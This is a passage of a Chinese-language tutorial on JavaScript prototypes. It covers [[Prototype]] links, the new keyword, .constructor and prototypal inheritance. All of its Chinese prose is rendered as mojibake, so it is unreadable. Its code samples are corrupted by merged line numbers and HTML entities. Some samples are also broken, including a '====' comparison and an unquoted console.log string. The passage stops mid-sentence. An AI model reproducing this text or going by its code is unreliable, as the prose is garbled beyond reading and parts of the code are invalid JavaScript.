1ï¼ŒæŽ¥ç€ç”¨ [[Put]] å°†å€¼3èµ‹ç»™ myObject ä¸­æ–°å»ºçš„å±è”½å±žæ€§ a ã€‚ ä¿®æ”¹å§”æ‰˜å±žæ€§æ—¶ä¸€å®šè¦å°å¿ƒï¼Œå¦‚æžœæƒ³è®© anotherObject.a çš„å€¼å¢žåŠ ï¼Œå”¯ä¸€çš„æ–¹æ³•æ˜¯ anotherObject.a++ï¼› â€œç±»â€ä¸ºä»€ä¹ˆä¸€ä¸ªå¯¹è±¡éœ€è¦å…³è”åˆ°å¦ä¸€ä¸ªå¯¹è±¡ï¼Ÿè¿™æ ·çš„å¥½å¤„æ˜¯ä»€ä¹ˆï¼Ÿä½†æ˜¯åœ¨å›žç­”è¿™ä¸ªé—®é¢˜ä¹‹å‰æˆ‘ä»¬åº”çŸ¥é“ [[Prototype]] ä¸æ˜¯ä»€ä¹ˆï¼Ÿ å‰é¢è¯´è¿‡ï¼ŒJavaScript å’Œé¢å‘ç±»çš„è¯­è¨€ä¸åŒï¼Œå®ƒå¹¶æ²¡æœ‰ç±»ä½œä¸ºå¯¹è±¡çš„æŠ½è±¡æ¨¡å¼æˆ–è€…è¯´è“å›¾ï¼Œå®žé™…ä¸Šï¼ŒJavaScript æ‰åº”è¯¥çœŸæ­£è¢«ç§°ä¸º â€œé¢å‘å¯¹è±¡â€çš„è¯­è¨€ï¼Œå› ä¸ºå®ƒæ˜¯å°‘æœ‰çš„å¯ä»¥ä¸é€šè¿‡ç±»ï¼Œç›´æŽ¥åˆ›å»ºå¯¹è±¡çš„è¯­è¨€ã€‚åœ¨ JavaScript ä¸­ï¼Œç±»æ— æ³•æè¿°å¯¹è±¡çš„è¡Œä¸ºï¼ˆå› ä¸ºæ ¹æœ¬å°±ä¸å­˜åœ¨ç±»ï¼‰å¯¹è±¡ç›´æŽ¥å®šä¹‰è‡ªå·±çš„è¡Œä¸ºï¼ŒJavaScript ä¸­åªæœ‰å¯¹è±¡ã€‚ â€œç±»â€å‡½æ•°å¤šå¹´ä»¥æ¥ï¼ŒJavaScript ä¸­æœ‰ä¸€ç§å¥‡æ€ªçš„è¡Œä¸ºä¸€ç›´è¢«æ»¥ç”¨ï¼Œé‚£å°±æ˜¯æ¨¡ä»¿ç±»ã€‚ è¿™ç§å¥‡æ€ªçš„ â€œç±»ä¼¼ç±»â€çš„è¡Œä¸ºåˆ©ç”¨äº†å‡½æ•°çš„ä¸€ç§ç‰¹æ®Šç‰¹æ€§ï¼šæ‰€æœ‰çš„å‡½æ•°éƒ½é»˜è®¤ä¼šæ‹¥æœ‰ä¸€ä¸ªåä¸º prototype çš„å…±æœ‰çš„å¹¶ä¸å¯æžšä¸¾çš„å±žæ€§ï¼Œå®ƒä¼šæŒ‡å‘å¦ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ­£æ˜¯è°ƒç”¨è¯¥æž„é€ å‡½æ•°è€Œåˆ›å»ºçš„å®žä¾‹çš„åŽŸåž‹ã€‚åŽŸåž‹æŒ‡çš„æ˜¯æ¯ä¸ª JavaScript å¯¹è±¡åœ¨åˆ›å»ºçš„æ—¶å€™ä¼šä¸Žä¹‹å…³è”çš„å¦ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯åŽŸåž‹ï¼Œæ¯ä¸€ä¸ªå¯¹è±¡éƒ½ä¼šä»ŽåŽŸåž‹ä¸­â€œç»§æ‰¿â€å±žæ€§ã€‚ 1234function Foo()&#123; //...&#125;Foo.prototype; // &#123;&#125; è¿™ä¸ªå¯¹è±¡é€šå¸¸è¢«ç§°ä¸º Foo çš„åŽŸåž‹ï¼Œå› ä¸ºæˆ‘ä»¬é€šè¿‡åä¸º Foo.prototype çš„å±žæ€§å¼•ç”¨æ¥è®¿é—®å®ƒã€‚ é‚£ä¹ˆæ‰¾ä¸ªå¯¹è±¡æ˜¯ä»€ä¹ˆï¼Ÿ æœ€ç›´æŽ¥çš„è§£é‡Šå°±æ˜¯ï¼Œé€šè¿‡è°ƒç”¨ new Foo() åˆ›å»ºçš„æ¯ä¸ªå¯¹è±¡éƒ½æœ€ç»ˆï¼ˆæœ‰ç‚¹æ­¦æ–­ï¼‰è¢« [[Prototype]] é“¾æŽ¥åˆ°è¿™ä¸ª â€œFoo.prototypeâ€ å¯¹è±¡ã€‚ 12345function Foo()&#123; //...&#125;var a = new Foo();Object.getPrototypeOf(a) === Foo.prototype; // true ä½¿ç”¨ new Foo() æ—¶ä¼šåˆ›å»º a ,å…¶ä¸­ä¸€æ­¥å°±æ˜¯å°† a å†…éƒ¨çš„ [[Prototype]] é“¾æŽ¥åˆ° Foo.prototype æ‰€æŒ‡å‘çš„å¯¹è±¡ã€‚ åœ¨é¢å‘ç±»çš„è¯­è¨€ä¸­ï¼Œç±»å¯ä»¥è¢«å¤åˆ¶ï¼ˆæˆ–è€…è¯´å®žä¾‹åŒ–ï¼‰å¤šæ¬¡ï¼Œå°±åƒç”¨æ¨¡å…·åˆ¶ä½œä¸œè¥¿ä¸€æ ·ï¼Œä¹‹æ‰€ä»¥ä¼šè¿™æ ·æ˜¯å› ä¸ºå®žä¾‹åŒ–ï¼ˆæˆ–è€…ç»§æ‰¿ä¸€ä¸ªç±»ï¼‰å°±æ„å‘³ç€â€œæŠŠç±»çš„è¡Œä¸ºå¤åˆ¶åˆ°ç‰©ç†å¯¹è±¡ä¸­â€ï¼Œå¯¹äºŽæ¯ä¸€ä¸ªæ–°å®žä¾‹æ¥è¯´éƒ½ä¼šé‡å¤è¿™ä¸ªè¿‡ç¨‹ã€‚ ä½†æ˜¯åœ¨ JavaScript ä¸­ï¼Œå¹¶æ²¡æœ‰ç±»ä¼¼çš„å¤åˆ¶æœºåˆ¶ï¼Œä½ ä¸èƒ½åˆ›å»ºä¸€ä¸ªç±»çš„å¤šä¸ªå®žä¾‹ï¼Œåªèƒ½åˆ›å»ºå¤šä¸ªå¯¹è±¡ï¼Œå®ƒä»¬çš„ [[Prototype]] å…³è”çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œä½†æ˜¯åœ¨é»˜è®¤çš„æƒ…å†µä¸‹å¹¶ä¸ä¼šå¤åˆ¶ï¼Œå› ä¸ºè¿™äº›å¯¹è±¡ä¹‹é—´å¹¶ä¸ä¼šå®Œå…¨å¤±åŽ»è”ç³»ï¼Œå®ƒä»¬æ˜¯äº’ç›¸å…³è”çš„ã€‚ new Foo() ä¼šç”Ÿæˆä¸€ä¸ªæ–°å¯¹è±¡ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º aï¼‰,è¿™ä¸ªæ–°å¯¹è±¡çš„å†…éƒ¨é“¾æŽ¥ [[prototype]] å…³è”çš„æ˜¯ Foo.prototype å¯¹è±¡ã€‚ æœ€åŽæˆ‘ä»¬å¾—åˆ°äº†ä¸¤ä¸ªå¯¹è±¡ï¼Œå®ƒä»¬ä¹‹é—´äº’ç›¸å…³è”ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰åˆå§‹åŒ–ä¸€ä¸ªç±»ï¼Œå®žé™…ä¸Šæˆ‘ä»¬å¹¶æ²¡æœ‰ä»Ž â€œç±»â€ä¸­å¤åˆ¶ä»»ä½•ä¸€ä¸ªè¡Œä¸ºåˆ°ä¸€ä¸ªå¯¹è±¡ä¸­ï¼Œåªæ˜¯è®©ä¸¤ä¸ªå¯¹è±¡äº’ç›¸å…³è”ã€‚ å®žé™…ä¸Šï¼Œç»å¤§å¤šæ•° JavaScript å¼€å‘è€…ä¸çŸ¥é“çš„ç§˜å¯†æ˜¯ï¼Œnew Foo() è¿™ä¸ªå‡½æ•°è°ƒç”¨å®žé™…ä¸Šå¹¶æ²¡æœ‰ç›´æŽ¥åˆ›å»ºå…³è”ï¼Œè¿™ä¸ªå…³è”åªæ˜¯ä¸€ä¸ªæ„å¤–çš„å‰¯ä½œç”¨ã€‚new Foo() åªæ˜¯é—´æŽ¥å®Œæˆäº†æˆ‘ä»¬çš„ç›®æ ‡ï¼šä¸€ä¸ªå…³è”åˆ°å…¶ä»–å¯¹è±¡çš„æ–°å¯¹è±¡ã€‚ é‚£ä¹ˆæœ‰æ²¡æœ‰æ›´ç›´æŽ¥çš„æ–¹æ³•æ¥åšåˆ°è¿™ä¸€ç‚¹å‘¢ï¼Ÿå½“ç„¶ï¼ŒåŠŸè‡£å°±æ˜¯ Object.create()ã€‚åŽé¢ä¼šä»‹ç»å®ƒã€‚ å…³äºŽåç§°åœ¨ JavaScript ä¸­ï¼Œæˆ‘ä»¬å¹¶ä¸ä¼šå°†ä¸€ä¸ªå¯¹è±¡ï¼ˆâ€œç±»â€ï¼‰å¤åˆ¶åˆ°å¦ä¸€ä¸ªå¯¹è±¡ï¼ˆå®žä¾‹ï¼‰ï¼Œåªæ˜¯å°†å®ƒä»¬å…³è”èµ·æ¥ï¼Œä»Žæ•°æ®è§’åº¦æ¥è¯´ï¼Œ[[Prototype]] æœºåˆ¶å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 123(b1)-- --(a1) |---&gt;(Bar.prototype)---&gt;(Foo.prototype)&lt;---|(b2)-- --(a2) è¿™ä¸ªæœºåˆ¶é€šå¸¸è¢«ç§°ä¸ºåŽŸåž‹ç»§æ‰¿ï¼Œå®ƒå¸¸å¸¸è¢«è§†ä¸ºåŠ¨æ€è¯­è¨€ç‰ˆæœ¬çš„ç±»ç»§æ‰¿ï¼Œè¿™ä¸ªåç§°ä¸»è¦æ˜¯ä¸ºäº†å¯¹åº”é¢å‘ç±»çš„ä¸–ç•Œä¸­ç»§æ‰¿çš„ä¸€æ ·ï¼Œä½†æ˜¯è¿èƒŒäº†åŠ¨æ€è„šæœ¬å¯¹åº”çš„è¯­ä¹‰ã€‚ â€œç»§æ‰¿â€è¿™ä¸ªè¯ä¼šè®©äººäº§ç”Ÿéžå¸¸å¼ºçš„å¿ƒç†é¢„æœŸï¼Œä»…ä»…åœ¨å‰é¢åŠ ä¸Šâ€œåŽŸåž‹â€å¹¶ä¸èƒ½åŒºåˆ†å‡º JavaScript å’Œç±»ç»§æ‰¿å‡ ä¹Žå®Œå…¨ç›¸åçš„è¡Œä¸ºã€‚ ç»§æ‰¿æ„å‘³ç€å¤åˆ¶æ“ä½œï¼ŒJavaScript ï¼ˆé»˜è®¤ï¼‰å¹¶ä¸ä¼šå¤åˆ¶å¯¹è±¡å±žæ€§ï¼Œç›¸åï¼ŒJavaScript ä¼šåœ¨ä¸¤ä¸ªå¯¹è±¡ä¹‹é—´åˆ›å»ºä¸€ä¸ªå…³è”ï¼Œè¿™æ ·ä¸€ä¸ªå¯¹è±¡å°±å¯ä»¥é€šè¿‡å§”æ‰˜è®¿é—®å¦ä¸€ä¸ªå¯¹è±¡çš„å±žæ€§å’Œå‡½æ•°ã€‚å§”æ‰˜è¿™ä¸ªæœ¯è¯­å¯ä»¥æ›´åŠ å‡†ç¡®åœ°æè¿° JavaScript ä¸­å¯¹è±¡çš„å…³è”æœºåˆ¶ã€‚ è¿˜æœ‰ä¸ªå¶å°”ä¼šç”¨åˆ°çš„ JavaScript æœ¯è¯­å·®å¼‚ç»§æ‰¿ï¼ŒåŸºæœ¬åŽŸåˆ™æ˜¯åœ¨æè¿°å¯¹è±¡è¡Œä¸ºæ—¶ï¼Œä½¿ç”¨å…¶ä¸åŒäºŽæè¿°çš„ç‰¹è´¨ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œæè¿°æ±½è½¦æ—¶ä½ ä¼šè¯´æ±½è½¦æ˜¯æœ‰å››ä¸ªè½®å­çš„ä¸€ç§äº¤é€šå·¥å…·ï¼Œä½†æ˜¯ä¸ä¼šé‡å¤æè¿°äº¤é€šå·¥å…·å…·å¤‡çš„é€šç”¨ç‰¹æ€§ï¼ˆæ¯”å¦‚å¼•æ“Žï¼‰ã€‚ å¦‚æžœä½ æŠŠ JavaScript ä¸­å¯¹è±¡çš„æ‰€æœ‰å§”æ‰˜è¡Œä¸ºéƒ½å½’ç»“äºŽå¯¹è±¡æœ¬èº«å¹¶ä¸”æŠŠå¯¹è±¡çœ‹ä½œæ˜¯å®žç‰©çš„è¯ï¼Œé‚£å°±ï¼ˆå·®ä¸å¤šï¼‰å¯ä»¥ç†è§£å·®å¼‚ç»§æ‰¿äº†ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå¯¹è±¡å¹¶ä¸ä¼šåƒå·®å¼‚ç»§æ‰¿é‚£æ ·æš—ç¤ºçš„é€šè¿‡å¤åˆ¶ç”Ÿæˆï¼Œå› æ­¤ï¼Œå·®å¼‚ç»§æ‰¿ä¹Ÿä¸é€‚åˆç”¨æ¥æè¿° JavaScript ä¸­çš„ [[Prototype]] æœºåˆ¶ã€‚ â€œæž„é€ å‡½æ•°â€å›žåˆ°ä¹‹å‰çš„ä»£ç ï¼š 1234function Foo()&#123; //...&#125;var a = new Foo(); æ˜¯ä»€ä¹ˆè®©æˆ‘ä»¬è®¤ä¸º Foo æ˜¯ä¸€ä¸ªç±»å‘¢ï¼Ÿ å…¶ä¸­ä¸€ä¸ªåŽŸå› hisæˆ‘ä»¬çœ‹åˆ°äº†å…³é”®å­— new ,åœ¨é¢å‘ç±»çš„è¯­è¨€æ±‡æ€»æž„é€ å®žä¾‹æ—¶ä¹Ÿä¼šç”¨åˆ°å®ƒã€‚å¦ä¸€ä¸ªåŽŸå› æ˜¯ï¼Œçœ‹èµ·æ¥æˆ‘ä»¬æ‰§è¡Œäº†ç±»çš„æž„é€ å‡½æ•°æ–¹æ³•ï¼ŒFooï¼ˆï¼‰ è°ƒç”¨æ–¹å¼å¾ˆåƒåˆå§‹åŒ–ç±»æ—¶ç±»æž„é€ å‡½æ•°è°ƒç”¨æ–¹å¼ã€‚ å¤„ç†ä»¤äººè¿·æƒ‘çš„â€œæž„é€ å‡½æ•°â€è¯­ä¹‰å¤–ï¼ŒFoo.prototype è¿˜æœ‰å¦ä¸€ä¸ªç»æ‹›ï¼Œæ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 123456function Foo()&#123; //...&#125;Foo.prototype.constructor ==== Foo; // truevar a = new Foo();a.constructor === Foo; // true Foo.prototypeé»˜è®¤æœ‰ä¸€ä¸ªå…±æœ‰çš„å¹¶ä¸”ä¸å¯æžšä¸¾çš„å±žæ€§ .constructorï¼Œè¿™ä¸ªå±žæ€§å¼•ç”¨çš„æ˜¯å¯¹è±¡å…³è”çš„å‡½æ•°ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ª â€œå¤Ÿç€å‡½æ•°â€è°ƒç”¨ new Foo() åˆ›å»ºçš„å¯¹è±¡ä¹Ÿæœ‰ä¸€ä¸ª .constructor å±žæ€§ï¼ŒæŒ‡å‘â€œåˆ›å»ºè¿™ä¸ªå¯¹è±¡çš„å‡½æ•°â€ã€‚ å®žé™…ä¸Š a æœ¬èº«å¹¶æ²¡æœ‰ .constructor å±žæ€§ï¼Œè€Œä¸”ï¼Œè™½ç„¶ a.constructor ç¡®å®žæŒ‡å‘ Foo å‡½æ•°ï¼Œä½†æ˜¯è¿™ä¸ªå±žæ€§å¹¶ä¸æ˜¯è¡¨ç¤º a ç”± Foo â€œæž„é€ â€ã€‚ â€œç±»â€ é¦–å­—æ¯è¦å¤§å†™ã€‚ 1.æž„é€ å‡½æ•°è¿˜æ˜¯è°ƒç”¨ä¸Šä¸€æ®µä»£ç ä¸­å¾ˆå®¹æ˜“è®©äººè®¤ä¸º Foo æ˜¯ä¸€ä¸ªæž„é€ å‡½æ•°ï¼Œå› ä¸ºæˆ‘ä»¬ä½¿ç”¨ new æ¥è°ƒç”¨å®ƒå¹¶çœ‹åˆ°å®ƒ â€œæž„é€ â€ äº†ä¸€ä¸ªå¯¹è±¡ã€‚ å®žé™…ä¸Š,Foo å’Œ ç¨‹åºä¸­çš„å…¶ä»–å‡½æ•°æ²¡æœ‰ä»»ä½•åŒºåˆ«ï¼Œå‡½æ•°æœ¬èº«å¹¶ä¸æ˜¯æž„é€ å‡½æ•°ï¼Œç„¶è€Œï¼Œå½“ä½ åœ¨æ™®é€šçš„å‡½æ•°è°ƒç”¨åŠ ä¸Š new å…³é”®å­—ä¹‹åŽï¼Œå°±ä¼šæŠŠè¿™ä¸ªå‡½æ•°è°ƒç”¨å˜æˆäº†ä¸€ä¸ª â€œæž„é€ å‡½æ•°è°ƒç”¨â€ã€‚å®žé™…ä¸Šï¼Œnew ä¼šåŠ«æŒæ‰€æœ‰æ™®é€šå‡½æ•°å¹¶ç”¨æž„é€ å¯¹è±¡çš„å½¢å¼æ¥è°ƒç”¨å®ƒã€‚ä¸¾ä¾‹æ¥è¯´ï¼š 123456function NothingSpecial()&#123; console.log(Do not mind me!);&#125;var a = new NothingSpecial();// Do not mind me!a; // &#123;&#125; NothingSpecial åªæ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°ï¼Œä½†æ˜¯ä½¿ç”¨ new è°ƒç”¨æ—¶ï¼Œå®ƒå°±ä¼šæž„é€ ä¸€ä¸ªå¯¹è±¡å¹¶èµ‹å€¼ç»™ aï¼Œè¿™çœ‹èµ·æ¥æ˜¯ new çš„ä¸€ä¸ªå‰¯ä½œç”¨ï¼ˆæ— è®ºå¦‚ä½•éƒ½ä¼šæž„é€ ä¸€ä¸ªå¯¹è±¡ï¼‰ï¼Œè¿™ä¸ªè°ƒç”¨æ˜¯ä¸€ä¸ªæž„é€ å‡½æ•°è°ƒç”¨ï¼Œä½†æ˜¯ NothingSpecial æœ¬èº«å¹¶ä¸æ˜¯ä¸€ä¸ªæž„é€ å‡½æ•°ã€‚ æ¢å¥è¯è¯´ï¼Œåœ¨ JavaScript ä¸­å¯¹äºŽ â€œæž„é€ å‡½æ•°â€ æœ€å‡†ç¡®çš„è¯´æ³•æ˜¯ï¼Œæ‰€æœ‰å¸¦ new çš„å‡½æ•°è°ƒç”¨ã€‚ å‡½æ•°ä¸æ˜¯æž„é€ å‡½æ•°ï¼Œä½†æ˜¯å½“ä¸”ä»…å½“ä½¿ç”¨ new æ—¶ï¼Œå‡½æ•°è°ƒç”¨ä¼šå˜æˆâ€œæž„é€ å‡½æ•°è°ƒç”¨â€ã€‚ æŠ€æœ¯JavaScript å¼€å‘è€…æƒ³è¦æ¨¡ä»¿ç±»çš„è¡Œä¸ºï¼š 1234567891011function Foo(name)&#123; this.name = name;&#125;Foo.prototype.myName = function()&#123; return this.name;&#125;var a = new Foo("a");var b = new Foo("b");a.myName(); // "a"b.myName(); // "b" è¿™æ®µä»£ç å±•ç¤ºäº†å¦å¤–ä¸¤ç§â€œé¢å‘ç±»â€çš„æŠ€å·§ï¼š this.name = name ç»™æ¯ä¸ªå¯¹è±¡ï¼ˆä¹Ÿå°±æ˜¯ a å’Œ b ï¼‰éƒ½æ·»åŠ äº†ä¸€ä¸ª .name å±žæ€§ï¼Œæœ‰ç‚¹åƒç±»å®žä¾‹å°è£…çš„æ•°æ®å€¼ Foo.prototype.myName = .. å¯èƒ½æ˜¯ä¸€ä¸ªæ›´åŠ æœ‰è¶£çš„æŠ€å·§ï¼Œå®ƒä¼šç»™Foo.prototype å¯¹è±¡æ·»åŠ ä¸€ä¸ªå±žæ€§ï¼ˆå‡½æ•°ï¼‰ï¼ŒçŽ°åœ¨ï¼Œa.myName() å¯ä»¥æ­£å¸¸å·¥ä½œï¼Œä½†æ˜¯ä½ å¯èƒ½ä¼šè§‰å¾—å¾ˆæƒŠè®¶ï¼Œè¿™æ˜¯ä»€ä¹ˆåŽŸç†ï¼Ÿ è¿™æ®µä»£ç ä¸­ï¼Œçœ‹èµ·æ¥ä¼¼ä¹Žåˆ›å»º a å’Œ b ä¼šæŠŠ Foo.prototype å¯¹è±¡å¤åˆ¶åˆ°è¿™ä¸¤ä¸ªå¯¹è±¡ä¸­ï¼Œç„¶è€Œäº‹å®žå¹¶ä¸æ˜¯è¿™æ ·çš„ã€‚ åœ¨å‰é¢ä»‹ç» é»˜è®¤[[Get]] ç®—æ³•çš„æ—¶å€™æˆ‘ä»¬ä»‹ç»è¿‡ [[Prototype]]é“¾ï¼Œä»¥åŠå½“å±žæ€§ä¸ç›´æŽ¥å­˜åœ¨äºŽå¯¹è±¡ä¸­å¦‚ä½•é€šè¿‡å®ƒæ¥è¿›è¡ŒæŸ¥æ‰¾ã€‚ å› æ­¤ï¼Œåœ¨åˆ›å»ºçš„è¿‡ç¨‹ä¸­,a å’Œ b çš„å†…éƒ¨ [[Prototype]] éƒ½ä¼šå…³è”åˆ° Foo.prototype ä¸Šï¼Œå½“ a å’Œ b ä¸­éƒ½æ— æ³•æ‰¾åˆ° myName çš„æ—¶å€™ï¼Œå®ƒä¼šï¼ˆé€šè¿‡å§”æ‰˜ï¼‰åœ¨ Foo.prototype ä¸Šæ‰¾åˆ°ã€‚ å›žé¡¾â€æž„é€ å‡½æ•°â€œä¹‹å‰è®¨è®º .constructor å±žæ€§çš„æ—¶å€™è¯´è¿‡ï¼Œa.constructor === Foo ä¸ºçœŸæ„å‘³ç€ a ç¡®å®žæœ‰ä¸€ä¸ªæŒ‡å‘ Foo çš„ .constructor å±žæ€§ï¼Œä½†æ˜¯äº‹å®žå¹¶ä¸æ˜¯è¿™æ ·çš„ã€‚ å®žé™…ä¸Šï¼Œ.constructor å¼•ç”¨åŒæ ·è¢«å§”æ‰˜ç»™ Foo.prototypeï¼Œè€Œ Foo.prototype.constructor é»˜è®¤æŒ‡å‘äº† Fooã€‚ æŠŠ .constructor å±žæ€§æŒ‡å‘ Foo çœ‹ä½œæ˜¯ a å¯¹è±¡ç”± Foo â€œæž„é€ â€ æ˜¯éžå¸¸å®¹æ˜“ç†è§£çš„ï¼Œä½†è¿™åªä¸è¿‡æ˜¯ä¸€ç§è™šå‡çš„å®‰å…¨æ„Ÿï¼Œa.constructor åªæ˜¯é€šè¿‡é»˜è®¤çš„ [[Prototype]] å§”æ‰˜æŒ‡å‘äº† Foo,è¿™å’Œâ€œæž„é€ â€æ¯«æ— å…³ç³»ã€‚ç›¸åï¼Œå¯¹äºŽ .constructor çš„é”™è¯¯ç†è§£å¾ˆå®¹æ˜“å¯¹è‡ªå·±äº§ç”Ÿè¯¯å¯¼ã€‚ ä¸¾ä¾‹æ¥è¯´ï¼ŒFoo.prototype çš„ .constructor å±žæ€§åªæ˜¯ Foo å‡½æ•°åœ¨å£°æ˜Žæ—¶çš„é»˜è®¤å±žæ€§ï¼Œå¦‚æžœä½ åˆ›å»ºäº†ä¸€ä¸ªæ–°å¯¹è±¡å¹¶æ›¿æ¢äº†å‡½æ•°é»˜è®¤çš„ .prototype å¯¹è±¡å¼•ç”¨ï¼Œé‚£ä¹ˆæ–°å¯¹è±¡å¹¶ä¸ä¼šè‡ªåŠ¨èŽ·å¾— .constructor å±žæ€§ã€‚ æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 12345function Foo()&#123;/*..*/&#125;Foo.prototype = &#123;/*..*/&#125; // åˆ›å»ºä¸€ä¸ªæ–°åŽŸåž‹å¯¹è±¡var a1 = new Foo();a1.constructor === Foo; // falsea1.constructor === Object; // true Object(â€¦) å¹¶æ²¡æœ‰ â€œæž„é€ â€ a1ï¼Œçœ‹èµ·æ¥åº”è¯¥æ˜¯ Foo() â€œæž„é€ â€äº†å®ƒã€‚å¤§éƒ¨åˆ†å¼€å‘è€…éƒ½è®¤ä¸ºæ˜¯ Foo() æ‰§è¡Œäº†æž„é€ å·¥ä½œï¼Œä½†æ˜¯é—®é¢˜åœ¨äºŽï¼Œå¦‚æžœä½ è®¤ä¸º â€œconstructorâ€ è¡¨ç¤º â€œç”±â€¦æž„é€ â€çš„è¯ï¼Œa1.constructor åº”è¯¥æ˜¯ Foo,ä½†æ˜¯å®ƒå¹¶ä¸æ˜¯ Foo. a1 å¹¶æ²¡æœ‰ .constructor å±žæ€§ï¼Œå®ƒä¼šå§”æ‰˜ [[prototype]] é“¾ä¸Šçš„ Foo.prototypeã€‚ä½†æ˜¯è¿™ä¸ªå¯¹è±¡ä¹Ÿæ²¡æœ‰ .constructor å±žæ€§ï¼ˆä¸è¿‡é»˜è®¤çš„Foo.prototype å¯¹è±¡æœ‰è¿™ä¸ªå±žæ€§ï¼ï¼‰ï¼Œæ‰€ä»¥å®ƒä¼šç»§ç»­å§”æ‰˜ï¼Œè¿™æ¬¡ä¼šå§”æ‰˜é“¾é¡¶ç«¯çš„ Object.prototypeï¼Œè¿™ä¸ªå¯¹è±¡æœ‰ .constructor å±žæ€§ï¼ŒæŒ‡å‘å†…ç½®çš„ Object(..) å‡½æ•°ã€‚ å½“ç„¶ï¼Œä½ å¯ä»¥ç»™ Foo.prototype æ·»åŠ ä¸€ä¸ª .constructor å±žæ€§ï¼Œä¸è¿‡è¿™éœ€è¦æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªç¬¦åˆæ­£å¸¸çš„ä¸å¯æžšä¸¾çš„å±žæ€§ã€‚ 12345678910function Foo()&#123;/*..*/&#125;Foo.prototype = &#123;/*..*/&#125; // åˆ›å»ºä¸€ä¸ªæ–°åŽŸåž‹å¯¹è±¡// éœ€è¦åœ¨ Foo.prototype ä¸Š â€œä¿®å¤â€ä¸¢å¤±çš„ .constructor å±žæ€§// æ–°å¯¹è±¡å±žæ€§èµ·åˆ° Foo.prototype çš„ä½œç”¨Object.defineProperty(Foo.prototype,"constructor",&#123; enumerable:false, writable:true, configurable:true, value:Foo // è®© .constructor æŒ‡å‘ Foo&#125;) ä¿®å¤ .constructor éœ€è¦å¾ˆå¤šæ‰‹åŠ¨æ“ä½œï¼Œæ‰€ä»¥è¿™äº›å·¥ä½œéƒ½æ˜¯æºäºŽæŠŠ â€œconstructorâ€ é”™è¯¯åœ°ç†è§£ä¸º â€œç”±â€¦æž„é€ â€ã€‚ å®žé™…ä¸Šï¼Œå¯¹è±¡çš„ .constructor å±žæ€§é»˜è®¤æŒ‡å‘ä¸€ä¸ªå‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°ä¹Ÿæœ‰ä¸€ä¸ªå«åš .prototype çš„å¼•ç”¨æŒ‡å‘è¿™ä¸ªå¯¹è±¡ã€‚â€œæž„é€ å‡½æ•°â€ å’Œ â€œåŽŸåž‹â€ è¿™ä¸¤ä¸ªè¯é»˜è®¤åªæœ‰æ¾æ•£çš„å«ä¹‰ï¼Œå®žé™…çš„å€¼å¯èƒ½é€‚ç”¨ä¹Ÿå¯èƒ½ä¸é€‚ç”¨ã€‚æœ€å¥½çš„åŠžæ³•æ˜¯è®°ä½ â€œconstructor å¹¶ä¸è¡¨ç¤ºï¼ˆå¯¹è±¡ï¼‰è¢«ï¼ˆå®ƒï¼‰æž„é€ â€ .constructor å¹¶ä¸æ˜¯ä¸€ä¸ªä¸å¯å˜çš„å±žæ€§ï¼Œå®ƒæ˜¯ä¸å¯æžšä¸¾çš„ï¼Œä½†æ˜¯å®ƒçš„å€¼æ˜¯å¯å†™çš„ï¼ˆå¯ä»¥è¢«ä¿®æ”¹ï¼‰ã€‚æ­¤å¤–ï¼Œå¯ä»¥ç»™ä»»æ„çš„ [[Prototype]] é“¾ä¸­çš„ä»»æ„å¯¹è±¡æ·»åŠ ä¸€ä¸ªåä¸º constructor çš„å±žæ€§æˆ–è€…å¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼Œä½ å¯ä»¥ä»»æ„å¯¹å…¶èµ‹å€¼ã€‚ å’Œ [[Get]] ç®—æ³•æŸ¥æ‰¾ [[Prototype]] é“¾çš„æœºåˆ¶ä¸€æ ·ï¼Œ .constructor å±žæ€§çš„å¼•ç”¨ç›®æ ‡å¯èƒ½å’Œä½ æƒ³çš„å®Œå…¨ä¸åŒã€‚ a1.constructor æ˜¯ä¸€ä¸ªéžå¸¸ä¸å¯é å¹¶ä¸”ä¸å®‰å…¨çš„å¼•ç”¨ï¼Œé€šå¸¸æ¥è¯´è¦å°½é‡é¿å…ä½¿ç”¨è¿™äº›å¼•ç”¨ã€‚ ï¼ˆåŽŸåž‹ï¼‰ç»§æ‰¿æˆ‘ä»¬å·²ç»çœ‹è¿‡äº†è®¸å¤š JavaScript ç¨‹åºä¸­å¸¸ç”¨çš„æ¨¡æ‹Ÿç±»è¡Œä¸ºçš„æ–¹æ³•ï¼Œä½†æ˜¯å¦‚æžœæ²¡æœ‰ â€œç»§æ‰¿â€æœºåˆ¶çš„è¯ï¼ŒJavaScript ä¸­çš„ç±»å°±æ˜¯ä¸€ä¸ªç©ºæž¶å­ã€‚ å®žé™…ä¸Šï¼Œæˆ‘ä»¬äº†è§£äº†é€šå¸¸è¢«ç§°ä½œåŽŸåž‹ç»§æ‰¿çš„æœºåˆ¶ï¼Œa å¯ä»¥ â€œç»§æ‰¿â€ Foo.prototype å¹¶è®¿é—® Foo.prototype çš„ myName() å‡½æ•°ã€‚ä½†æ˜¯ä¹‹å‰æˆ‘ä»¬åªæŠŠç»§æ‰¿çœ‹åšæ˜¯ç±»å’Œç±»ä¹‹é—´çš„å…³ç³»ï¼Œå¹¶æ²¡æœ‰æŠŠå®ƒå½“åšæ˜¯ç±»å’Œå®žä¾‹ä¹‹é—´çš„å…³ç³»ã€‚ ä¸‹é¢çš„ä»£ç ä½¿ç”¨çš„å°±æ˜¯å…¸åž‹çš„ â€œåŽŸåž‹é£Žæ ¼â€ï¼š 12345678910111213141516171819202122function Foo(name)&#123; this.name = name;&#125;Foo.prototype.myName = function()&#123; return this.name;&#125;function Bar(name,label)&#123; Foo.call(this,name); this.label = label;&#125;// æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ Bar.prototype å¯¹è±¡å¹¶å…³è”åˆ° 